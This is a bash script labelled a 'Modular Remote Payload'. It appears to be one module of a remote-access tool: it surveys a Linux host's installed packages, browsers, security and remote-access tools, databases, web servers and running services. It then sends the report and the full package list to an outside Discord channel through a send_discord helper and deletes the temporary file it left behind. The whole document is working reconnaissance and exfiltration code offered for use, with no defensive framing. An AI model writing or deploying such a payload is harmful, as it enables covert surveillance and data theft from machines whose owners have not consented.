#!/bin/bash
# ============================================================
# Installed Software for Linux - Modular Remote Payload
# ============================================================
# Lists installed packages and interesting software
# ============================================================

SYSID=$(get_sysid)
OUTPUT="📦 **Installed Software on $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Detect package manager and count packages
OUTPUT+="**📊 PACKAGE COUNT**\n"
if command -v dpkg &>/dev/null; then
    COUNT=$(dpkg -l | grep -c "^ii")
    OUTPUT+="• Debian/Ubuntu packages: \`$COUNT\`\n"
elif command -v rpm &>/dev/null; then
    COUNT=$(rpm -qa | wc -l)
    OUTPUT+="• RPM packages: \`$COUNT\`\n"
elif command -v pacman &>/dev/null; then
    COUNT=$(pacman -Q | wc -l)
    OUTPUT+="• Pacman packages: \`$COUNT\`\n"
fi
OUTPUT+="\n"

# Interesting software detection
OUTPUT+="**🔍 INTERESTING SOFTWARE**\n"

# Browsers
for browser in firefox chromium google-chrome brave; do
    command -v $browser &>/dev/null && OUTPUT+="• Browser: \`$browser\` ✅\n"
done

# Development tools
for dev in git docker python3 node npm go rustc java; do
    command -v $dev &>/dev/null && OUTPUT+="• Dev tool: \`$dev\` ✅\n"
done

# Security tools
for sec in nmap wireshark tcpdump burpsuite metasploit; do
    command -v $sec &>/dev/null && OUTPUT+="• Security: \`$sec\` ✅\n"
done

# Remote access
for remote in ssh sshd openvpn wireguard teamviewer anydesk; do
    command -v $remote &>/dev/null && OUTPUT+="• Remote: \`$remote\` ✅\n"
done

# Databases
for db in mysql postgres sqlite3 redis mongodb; do
    command -v $db &>/dev/null && OUTPUT+="• Database: \`$db\` ✅\n"
done

# Web servers
for web in apache2 nginx httpd; do
    command -v $web &>/dev/null && OUTPUT+="• Web server: \`$web\` ✅\n"
done

OUTPUT+="\n"

# Running services
OUTPUT+="**⚙️ RUNNING SERVICES**\n"
if command -v systemctl &>/dev/null; then
    systemctl list-units --type=service --state=running 2>/dev/null | head -15 | while read line; do
        OUTPUT+="• $line\n"
    done
else
    service --status-all 2>/dev/null | grep "+" | head -15 | while read line; do
        OUTPUT+="• $line\n"
    done
fi

# Save full package list to file if too long
TMPFILE="/tmp/packages_$SYSID.txt"
if command -v dpkg &>/dev/null; then
    dpkg -l > "$TMPFILE"
elif command -v rpm &>/dev/null; then
    rpm -qa > "$TMPFILE"
elif command -v pacman &>/dev/null; then
    pacman -Q > "$TMPFILE"
fi

if [[ -f "$TMPFILE" ]]; then
    send_discord "$OUTPUT" "$TMPFILE"
    rm -f "$TMPFILE"
else
    send_discord "$OUTPUT"
fi

